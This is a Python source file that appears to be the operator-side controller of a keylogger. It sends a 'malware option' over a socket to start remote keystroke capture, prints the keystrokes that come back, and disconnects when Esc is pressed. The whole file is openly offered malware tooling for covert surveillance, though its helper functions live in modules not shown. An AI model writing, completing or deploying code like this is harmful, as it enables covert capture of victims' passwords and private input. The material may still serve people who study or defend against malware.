import threading
from pynput.keyboard import Key
import time
from PythonSecurity.utils import *
from config import KEYLOGGER_OPTION

disconnect_socket = threading.Event()
started_keylogger = threading.Event()

# polling socket server
def keylogger(client_socket):
    time.sleep(1)
    send_malware_option(client_socket, KEYLOGGER_OPTION)

    while not disconnect_socket.is_set():
        try:
            data = receive_from_server(client_socket)
            print(f"Received: {data}")
        except (BlockingIOError, ConnectionResetError, BrokenPipeError):
            pass

    print("Keylogger thread is stopping")
    return False

# kill keylogger thread when the user presses the esc key
def on_kill(key):
    if key == Key.esc and started_keylogger.is_set():
        disconnect_socket.set()
        return False  # Stop the listener

def start_keylogger():
    client_unblocked_socket = make_and_connect_unblocked_socket_to_server()
    keylogger_thread = make_thread(keylogger, client_unblocked_socket)
    started_keylogger.set()
    keylogger_thread.start()

    with make_keyboard_listener(on_kill) as escape_key_listener:
        escape_key_listener.join()

    keylogger_thread.join()

    if disconnect_socket.is_set():
        disconnect_socket.clear()
        disconnect(client_unblocked_socket)  # Disconnect from the socket